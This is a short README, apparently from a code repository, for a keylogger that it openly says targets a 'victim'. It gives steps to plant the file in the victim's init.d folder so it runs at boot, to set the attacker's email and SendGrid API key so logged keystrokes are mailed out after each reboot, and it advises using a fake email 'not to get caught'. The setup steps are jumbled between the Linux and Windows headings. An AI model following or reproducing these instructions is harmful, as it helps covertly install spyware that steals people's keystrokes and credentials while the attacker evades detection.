# KeyLogger
This is a keylogger designed to send you email of the keylogs everytime the user or victim switch on his laptop.
#Linux
Copy this file to users PC in etc/init.d folder [linux] and then run [chmod +x etc/init.d/filename]
First create a virtual enviroment in the same folder and activate it
#Windows

Then pip3 install -r requirements.txt
The main.py is the keylogger file
edit the to_mail variable with your own mail
edit the sendgrid API key with your own

Now the first time user reboots the PC , a file name key_log.txt will be created.The next time he/she reboots the pc , the saved key from previous reboot will be sent to your mail and this goes on and on.
Make sure you use fake mail not to get caught.

Happy hacking!!!